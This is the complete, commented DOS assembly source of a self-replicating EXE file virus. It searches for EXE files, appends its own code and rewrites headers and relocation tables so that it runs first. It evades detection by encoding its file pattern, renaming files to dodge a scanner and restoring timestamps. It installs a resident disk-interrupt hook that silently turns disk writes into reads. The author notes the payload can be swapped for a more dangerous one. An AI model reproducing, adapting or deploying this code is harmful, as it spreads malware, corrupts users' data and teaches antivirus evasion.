;--------------------------------------------------------------------;
;                                                                    ;
;                  EXE virus, with resident part                     ;
;                                                                    ;
;                   ---- infecting program ----                      ;
;                                                                    ;
;--------------------------------------------------------------------;
  
;--------------------------------------------------------------------;
;                                                                    ;
;    WARNING : it's definitely NOT safe to assemble and execute      ;
;    this code. If anybody has to, I highly reccomend using          ;
;    a diskette and debugger.                                        ;
;                                                                    ;
;--------------------------------------------------------------------;
  
;*********************************************************************
  
;--------------------------------------------------------------------;
;                                                                    ;
; The EXE virus concept is as follows:                               ;
;                                                                    ;
; First, original Disk Transfer Address is preserved to avoid        ;
; changing command-line text. Also initial values of CS, IP, SS, SP  ;
; DS and ES are saved (to be restored on exit from virus code).      ;
;   Virus is to be appended to original code and, of course, has     ;
; to be relocated before it's executed. Thus, first we look for      ;
; an EXE file. Then we have to know if this is in fact an EXE        ;
; (checking for magic 'MZ' signature) and if there is any free space ;
; in relocation table. This is checked by substracting relocation    ;
; table end (i.e. sum of table start and number of relocation items, ;
; multiplied by table entry size) from EXE header size.              ;
;   Smart virus shouldn't infect a file that's already infected.     ;
; So first 4 bytes of code to be executed is compared against        ;
; virus code. If they match one another, no infection takes place.   ;
;   Having found suitable file, we compute its code end and append   ;
; virus at the end of code, writing alignment to last 512-bytes page ;
; boundary if necessary. Original start address is preserved inside  ;
; virus, and CS:IP value in EXE header gets changed, so that virus   ;
; code would be executed first. Number of pages gets changed,        ;
; together with Last Page Size and Number Of Relocation Items.       ;
;   New relocation item address is appended to relocation table,     ;
; pointing to the segment of the far jump in virus (this is the jump ;
; virus uses to return to original code).                            ;
;   Upon returning from virus, all saved registers and DTA are       ;
; restored to reestablish environment state as if no virus existed.  ;
;                                                                    ;
;   Virus also installs resident part, if it is not already present. ;
; This part's job is to replace all disk 'writes' with corresponding ;
; 'reads'. It's rather unharmful, but can easily be replaced with    ;
; more dangerous one (if somebody is really keen to be called ...).  ;
; Instalation can be removed with equal ease, as well.               ;
;                                                                    ;
;   The real trouble with EXEs is that DOS pays a little (if any)    ;
; attention to Last Page Size. Therefore EXE files ofen have this    ;
; zeroed, even if they have some code on the last page. Writing to   ;
; last page can cause system crash while infected file is being      ;
; executed. To solve the problem, one should first test if EXE file  ;
; really ends as the header contents say and move to last page end   ;
; instead of appending any bytes, if possible.                       ;
;                                                                    ;
;   Another problem is infecting EXEs containg debug info.           ;
; It comes in various formats, and often contains vital informations ;
; placed behind code. This info gets destroyed when file becomes     ;
; infected. I see no solution to this problem, so far.               ;
;                                                                    ;
;--------------------------------------------------------------------;
  
;********************************************************************;
  
;--------------------------------------------------------------------;
;                                                                    ;
;                        SEGMENT dummy                               ;
;                                                                    ;
;   Raison d'etre of this segment is to force assembling of          ;
;   the JMP FAR after the execution of virus code.                   ;
;                                                                    ;
;   This segment serves also to make it possible for the infecting   ;
;   program to return to DOS.                                        ;
;                                                                    ;
;--------------------------------------------------------------------;
  
  
    dummy    segment  'dummy'
  
             assume cs: dummy
  
    d_end    label far          ; this is the point virus jumps to
                                ; after executing itself
             mov  ah, 4Ch
             int  21h           ; DOS EXIT function
  
    dummy    ends
  
;--------------------------------------------------------------------;
;                                                                    ;
;                        SEGMENT code                                ;
;                                                                    ;
;   Code for virus (including its resident part).                    ;
;                                                                    ;
;   Executed from label start:. Exits via dummy:d_end.               ;
;                                                                    ;
;--------------------------------------------------------------------;
  
    code     segment  'code'
  
             public   start, jump, old_IP, old_CS, old_DTA,
             public   next, ok, exit, header, DTA, file_name, old_SS, old_SP, aux
             public   last_page, page_count, item_count, header_size, table_start
             public   header_IP, header_CS, header_SS, header_SP, aux_CS, aux_IP
             public   not_ok, time, date, attributes, new_name, found_name
             public   restore_and_close, dot, seek_dot, next_letter, install_flag
             public   next_lttr, EXE_sign, int_CS, int_IP, virus_length, set_ES
             public   resident, resident_size, l1, call_int, install, set_DS
  
             assume   cs : code, ds : code
  
;--------------------------------------------------------------------;
;                                                                    ;
;          Here are symbolic names for memory locations              ;
;                                                                    ;
;--------------------------------------------------------------------;
  
;  First go names for EXE header contents
  
    EXE_sign     equ  word ptr [header]
    last_page    equ  word ptr [header + 2]
    page_count   equ  word ptr [header + 4]
    item_count   equ  word ptr [header + 6]
    header_size  equ  word ptr [header + 8]
    header_SS    equ  word ptr [header + 0Eh]
    header_SP    equ  word ptr [header + 10h]
    header_IP    equ  word ptr [header + 14h]
    header_CS    equ  word ptr [header + 16h]
    table_start  equ  word ptr [header + 18h]
  
;  Now names for address of mother program
  
    old_IP       equ  word ptr [jump + 1]
    old_CS       equ  word ptr [jump + 3]
  
;  Segment to put resident part in, for instance end of 2nd Hercules page
  
   resident_CS   equ  0BFFEh
  
;  And label for the name of the file found by  Find_First and Find_Next
  
    found_name   equ  DTA + 1Eh
  
;  Last is virus length
  
    virus_length equ  offset header
  
;------------ Now starts virus code --------------------------------;

;  First original values of SS, SP, ES, DS are preserved,
;  and new values for this registers are set
  
    start:   mov  cx, ss            ; temporarily save SS in CX
             mov  dx, sp            ; and SP in DX
  
             mov  ax, cs            ; now AX = CODE
             cli                    ; disable hard ints while changing stack
             mov  ss, ax            ; now SS = CODE
             mov  sp, 0FFFFh        ; and SS points to segment end
             sti                    ; hardware interrupts are OK now
  
             push ds                ; preserve DS on stack
             push es                ; same with ES
  
             push cs
             pop  ds                ; set DS to CODE
  
             mov  [old_SS], cx      ; now as DS is CODE, we can store
             mov  [old_SP], dx      ; original SS and SP in memory
  
;  Original DTA is preserved now
  
             mov  ah, 2Fh
             int  21h
             mov  word ptr [old_DTA], bx      ; now ES:BX points to DTA
             mov  word ptr [old_DTA + 2], es  ; save its address in memory
  
;  Call to Get_DTA would have destroyed ES. Now set it
  
             push ds              ; set  ES to CODE
             pop  es
  
;  And now new DTA is established for virus disk actions
  
             mov  dx, offset DTA  ; DS:DX point to new DTA
             mov  ah, 1Ah
             int  21h
  
;  Store original INT_13 vector for use in resident part
  
             mov  ax, 3513h
             int  21h            ; DOS Get_Interrupt_Vector function

             mov  [int_IP], bx   ; now ES:BX holds INT_13 vector
             mov  [int_CS], es   ; store it inside resident part
  
;  Check if resident part already present
  
             mov  ax, es           ; compare can work with AX
  
             cmp  ax, resident_CS  ; check if this is resident_CS
             jnz  install          ; no, so install
  
             cmp  bx, 0            ; is offset 0 ?
             jnz  install          ; no, so install
  
;  Resident part found, do not install
  
             mov  [install_flag], 0 ; signal 'no installing'
  
             jmp  short  set_ES     ; and omit copying code
  
;  Now resident part is moved to its place in memory
  
install:     mov  ax, resident_CS
             mov  es, ax              ; ES = segment for resident part
             xor  di, di              ; DI = 0, resident starts from offset 0
             mov  si, offset resident ; SI = offset in DS for resident part
             mov  cx, resident_size   ; CX = size of resident part
  
             cld                      ; set auto increment
             rep  movsb               ; copy resident part from DS:SI to ES:DI
  
             mov  [install_flag], 1   ; signal 'instal vector'
  
;  Reestablish destroyed ES to CODE
  
  set_ES:    push ds
             pop  es
  
;  Now decode "*.EXE" name pattern. It's coded to disable 'eye-shot' discovery
  
             mov  si, offset file_name   ; name pattern starts there
             mov  cx, 5                  ; and is 5 bytes long
  
next_letter: inc  byte ptr [si]          ; decode by incrementing by one
             inc  si
             loop next_letter            ; decode all 5 bytes
  
;  Find an EXE file
  
             mov  dx, offset file_name   ; DS:DX points to '*.EXE'
             mov  cx, 20h                ; search for read-only files too
  
             mov  ah, 4Eh                ; DOS Find_First function
             int  21h                    ; now DTA gets filled with info
  
             jnc  check                  ; no carry means file found
                                         ; jump to check if to infect file
  
             jmp  exit                   ; no EXE file - nothing to do
  
;  Find next EXE file, if necessary
  
    next:    mov  ah, 4Fh                ;DOS Find_Next function
             int  21h
  
             jnc  check                  ; see jumps after Find_First
             jmp  exit                   ; for explanation
  
;  Check if file should and can be infected
  
;  First of all, get file attributes
  
    check:   mov  dx, offset found_name   ; DS:DX points to found file name
  
             mov  ax, 4300h               ; DOS Get_File_Attributes function
             int  21h                     ; attributes returned in CX
  
             mov  [attributes], cx        ; preserve them in memory
  
;  Then change file attributes to 'neutral'
  
             mov  dx, offset found_name   ; DS:DX points to found file name
             xor  cx, cx                  ; CX = 0 - means no attributes set
  
             mov  ax, 4301h               ; DOS Set_File_Attributes function
             int  21h                     ; attributes to be set in CX
  
;  To avoid being spotted by VIRBLK, rename ????????.EXE to ???????.
  
             mov  si, offset found_name   ; DS:DX points to found file name
             mov  di, offset new_name     ; ES:DI points to new name
  
             cld                          ; set auto increment
  
;  Copy old name to new name until dot found
  
  seek_dot:  lodsb                        ; get character at DS:SI
             cmp  al, '.'                 ; check if it is a dot
             stosb                        ; copy it anyway to ES:DI
  
             jz   dot                     ; dot found, end of copying
  
             loop seek_dot                ; if no dot, copy next character
  
;  DOS requires ASCIIZ strings, so append a byte of 0 to new name
  
       dot:  xor  al, al                  ; AL = 0
             stosb                        ; store 0 to byte at ES:DI
  
;  Now rename can be performed
  
             mov  dx, offset found_name   ; DS:DX points to old name
             mov  di, offset new_name     ; ES:DI points to new name
  
             mov  ah, 56h                 ; DOS Rename_File function
             int  21h
  
;  It is safe to open file now
  
             mov  dx, offset new_name     ; DS:DX points to file name
  
             mov  ax, 3D02h               ; DOS Open_File_Handle fuction
             int  21h                     ; open file for reading and writing
  
             jc   next                    ; carry set means for some reason
                                          ; operation failed
                                          ; try to find next file
  
;  Preserve handle for just open file in BX register
  
             mov  bx, ax                  ; all DOS calls require handle in BX
  
;  Now store original file time and date, to be restored on closing the file
  
             mov  ax, 5700h               ; DOS Get_File_Time_Date function
             int  21h                     ; time returned in CX, date in DX
  
             mov  [time], cx              ; store time in memory
             mov  [date], dx              ; same with date
  
;  Read EXE header to memory
  
             mov  dx, offset header       ; DS:DX = place to read header to
             mov  cx, 1Ah                 ; header is 1Ah bytes long
  
             mov  ah, 3Fh                 ; DOS Read_Handle function
             int  21h
  
;  Check if it is a real EXE, not just EXE-named file
  
 check_EXE:  cmp  EXE_sign, 5A4Dh         ; first two bytes of header should
                                          ; contain 'MZ' characters
  
	     jne  not_ok                  ; if not, don't proceed with file
  
;  It is EXE, check if it is already infected
;  by comparing code start with itself
  
;  Compute where code in file starts
  
             mov  ax, [header_CS]         ; get start CS for file
             add  ax, [header_size]       ; add header size
  
             mov  cx, 16                  ; above were in 16 bytes units
             mul  cx                      ; so multiply by 16
                                          ; DX|AX holds result
  
             add  ax, [header_IP]         ; add for IP
             adc  dx, 0                   ; propagate carry if necessasry
  
;  Now DX|AX holds file offset for code start, move there
  
             mov  cx, dx                  ; set registers for DOS call
             mov  dx, ax
  
             mov  ax, 4200h               ; DOS Move_File_Ptr function
             int  21h                     ; move relatively to start
  
;  Read first four bytes of code
  
             mov  dx, offset aux          ; DS:DX = place to read code into
             mov  cx, 4                   ; CX = number of bytes to read
  
             mov  ah, 3Fh                 ; DOS Read_Handle function
             int  21h
  
;  Compare them with itself
  
             mov  di, offset aux          ; ES:DI points to code from file
             mov  si, offset start        ; DS:SI points to itself start
             mov  cx, 2                   ; CX = number of words to compare
             cld                          ; set auto increment
  
             repe cmpsw                   ; compare while equal
  
             je   not_ok                  ; equal = infected, don't proceed
  
;  Check if there is space in relocation table to put one more item
  
;  Calculate where Relocation_Table ends
  
             mov  ax, [item_count]        ; get number of Relocation Items
             inc  ax                      ; add for new one
             mov  cx, 4                   ; each one is 4 bytes long
             mul  cx                      ; so multiply by 4
                                          ; DX|AX holds result
  
             add  ax, [table_start]       ; add offset of Relocation_Table
             adc  dx, 0                   ; process carry
  
;  Now DX|AX holds file offset for table end, store it temporarily in DI|SI
  
             mov  di, dx                  ; preserve Relocation_Table offset
             mov  si, ax
  
;  Calculate where code starts (in file)
  
             mov  ax, [header_size]       ; get header size for this EXE
             mov  cx, 10h                 ; as it is in 16 byte units,
             mul  cx                      ; multiply by 16
                                          ; DX|AX holds result
  
;  See if there is free space for relocation item
  
             sub  ax, si                  ; substract Relocation_Table end
             sbb  dx, di
  
             jae  ok                      ; Relocation_Table end not less
                                          ; then code start, so there IS room
  
;  If somehow this file is not to be infected, restore it's original state
  
    not_ok:  call restore_and_close
  
             jmp  next          ; nevertheless, try to find infectable one
  
;  File is to be infected now
  
;  First adjust file offset for new relocation item
  
    ok:      sub  si, 4                   ; new item starts 4 bytes
             sbb  di, 0                   ; before Relocation_Table end
  
;  Then preserve temporarily address of the mother code
  
             mov  ax, [old_CS]           ; preserve jump address via AX
             mov  [aux_CS], ax           ; in memory
             mov  ax, [old_IP]
             mov  [aux_IP], ax
  
;  Form inside itself a jump to new mother start
  
             mov  ax, [header_IP]        ; store new mother CS:IP as jump
             mov  [old_IP], ax           ; do it via AX
             mov  ax, [header_CS]
             mov  [old_CS], ax
  
;  Calculate last page alignment
  
             mov  cx, [last_page]         ; CX = number of bytes in last page
             mov  ax, 200h                ; AX = page size (page is 512 bytes)
  
             sub  ax, cx                  ; CX = alignment to page boundary
  
             mov  bp, ax                  ; preserve alignment in BP
  
; Calculate new CS:IP values to execute virus instead of mother
  
             mov  ax, [page_count]        ; get number of pages in new mother
             mov  cx, 20h                 ; multiply by 32 to convert to
             mul  cx                      ; 16 bytes units
  
             sub  ax, [header_size]       ; decrease by header size
  
;  Modify header as necessary
  
             mov  [header_CS], ax         ; AX holds CS for virus
             xor  ax, ax                  ; now zero AX
             mov  [header_IP], ax         ; as IP for virus is 0
  
             add  [page_count], 2         ; reserve space for virus
  
             inc  [item_count]            ; there'll be one more item
  
             mov  [last_page], offset header   ; last page will be as long
                                               ; as virus itself
             and  [last_page], 1FFh            ; modulo 512, of course
  
;  Move to file start
  
             xor  cx, cx                 ; start means offset 0
             xor  dx, dx
  
             mov  ax, 4200h              ; DOS Move_File_Ptr function
             int  21h                    ; move relatively to start
  
;  Write new header
  
             mov  dx, offset header      ; DS:DX points to new header
             mov  cx, 1Ah                ; which is still 1A bytes long
  
             mov  ah, 40h                ; DOS Write_Handle function
             int  21h
  
;  Move to new Relocation Item position
  
             mov  cx, di                 ; get stored position from DI|SI
             mov  dx, si
  
             mov  ax, 4200h              ; DOS Move_File_Ptr function
             int  21h                    ; move relatively to start
  
;  Write new relocation item
  
             mov  [header_IP], offset old_CS ; new Relocation Item offset
                                             ; is jump to new mother code
  
             mov  dx, offset header_IP       ; DS:DX = new relocation item
             mov  cx, 4                      ; exactly 4 bytes long
  
             mov  ah, 40h                 ; DOS Write_Handle function
             int  21h
  
;  Calculate file offset for new mother code end
  
             mov  ax, [header_CS]      ; get mother code lenght
             add  ax, [header_size]    ; add header size
             mov  cx, 10h              ; it's in 16 bytes units
             mul  cx                   ; so multiply by 16
  
             sub  ax, bp               ; last page is not full
             sbb  dx, 0                ; so move back appropirately
  
;  Move file ptr to mother code end
  
             mov  cx, dx               ; DX|AX = file offset to code end
             mov  dx, ax               ; set CX|DX for DOS call
  
             mov  ax, 4200h            ; DOS Move_File_Ptr function
             int  21h                  ; move relatively to start
  
;  Write alignement (no matter what, only number is important)
  
             mov  cx, bp               ; get alignement amount
  
             mov  ah, 40h              ; DOS Write_Handle function
             int  21h                  ; write CX bytes
  
;  Now prepare to append itself to EXE file
  
;  First encode EXE name patter anew
  
             mov  si, offset file_name   ; DS:SI points to name pattern
             mov  cx, 5                  ; it is 5 characters long
  
next_lttr:   dec  byte ptr [si]          ; encode by decrement
             inc  si
             loop next_lttr              ; encode all 5 characters
  
;  All ready, append itself now
  
             xor  dx, dx                 ; DX = 0, start offset for virus code
             mov  cx, virus_length       ; CX = number of bytes to write
  
             mov  ah, 40h                ; DOS Write_Handle function
             int  21h
  
;  No further action involving file will be taken, so restore it's state
  
             call restore_and_close      ; restore date and time, close file
  
;  Restore jump to this mother code
  
             mov  ax, [aux_CS]         ; restore jump addres via AX
             mov  [old_CS], ax
             mov  ax, [aux_IP]
             mov  [old_IP], ax
  
;  All done with infecting, prepare to execute mother
  
;  Restore original DTA
  
             push ds                   ; preserve DS (now DS = CODE)
  
    exit:    lds  dx, old_DTA          ; get original DTA address to DS:DX
  
             mov  ah, 1Ah              ; DOS Set_DTA function
             int  21h
  
;  Check if install new INT_13 vector
  
             cmp  [install_flag], 0    ; 0 means no installing
  
             jz   set_DS               ; omit installing
  
;  Install  resident part
  
             mov  ax, resident_CS      ; load CS for resident to DS (via AX)
             mov  ds, ax
             xor  dx, dx               ; DS:DX = address of resident part
  
             mov  ax, 2513h            ; DOS Set_Interrupt_Vector function
             int  21h                  ; set vector for INT_13
  
set_DS:      pop  ds                   ; restore DS to CODE
  
             mov  bx, [old_SS]         ; BX = original SS
             mov  cx, [old_SP]         ; CX = original SP
  
             pop  es                   ; restore original DS and ES
             pop  ds
  
             cli                       ; disable hardware interrupts
             mov  sp, cx               ; while restoring original SS:SP
             mov  ss, bx
             sti                       ; enable hardware interrupts
  
;  Virus has done all its job, now let mother do its own
  
    jump:    jmp  dummy:d_end          ; jump to original code
  
  
;-----------  here is the one and only procedure -------------------;
  
    restore_and_close  proc  near
  
;  Restore original file time and date
  
             mov  cx, [time]           ; get saved time
             mov  dx, [date]           ; get saved date
  
             mov  ax, 5701h               ; DOS Set_File_Time_Date function
             int  21h                     ; time set as CX, date as DX
  
;  Close file
  
             mov  ah, 3Eh              ; DOS Close_File function
             int  21h
  
;  Restore original name
  
             mov  dx, offset new_name    ; DS:DX points to new name
             mov  di, offset found_name  ; ES:DI points to original name
  
             mov  ah, 56h                 ; DOS Rename_File function
             int  21h
  
; Restore original file attributes
  
             mov  dx, offset found_name   ; restore attributes
             mov  cx, [attributes]
  
             mov  ax, 4301h               ; DOS Set_File_Attributes function
             int  21h                     ; attributes set as CX
  
             ret
  
    restore_and_close  endp
  
  
;------------ and here go the resident part of the virus -------------;
  
resident:    pushf                   ; save flags
  
             cmp  ah, 3              ; is it Disk_Write_1 ?
             jnz l1                  ; no, check Disk_Write_2
  
             mov  ah, 2              ; yes, convert to Disk_Read_1
             jmp  short  call_int    ; and exit resident
  
      l1:    cmp  ah, 0Bh            ; is it Disk_Write_2 ?
             jnz  call_int           ; no, exit resident
  
             mov  ah, 0Ah            ; yes, convert to Disk_Read_2
  
call_int:    popf                    ; restore flags
  
  
;  Next 5 bytes form long jump to original INT_13 handler
  
             db   0EAh               ; means JMP FAR
  
int_IP       dw   0                  ; and here the address to jump to
int_CS       dw   0
  
resident_size  equ  $ - resident
  
;-------- now data for virus, just encoded file name pattern -------;
  
    file_name  db  ')-DWD', 0
  
;-------------------------------------------------------------------;
;                                                                   ;
;         Here VIRUS ends. The rest are purely placeholders         ;
;                                                                   ;
;-------------------------------------------------------------------;
  
;*******************************************************************;

    header   dw   13 dup (0)

    old_SS   dw   0
    old_SP   dw   0

    aux_CS   dw   0
    aux_IP   dw   0

    old_DTA  dd   0

    time     dw   0
    date     dw   0

    attributes  dw  0

    install_flag db 0

    new_name    db  9 dup (0)

    DTA      dw   2Ch dup (0)

    aux      dw   2 dup (0)

    code     ends

             end  start
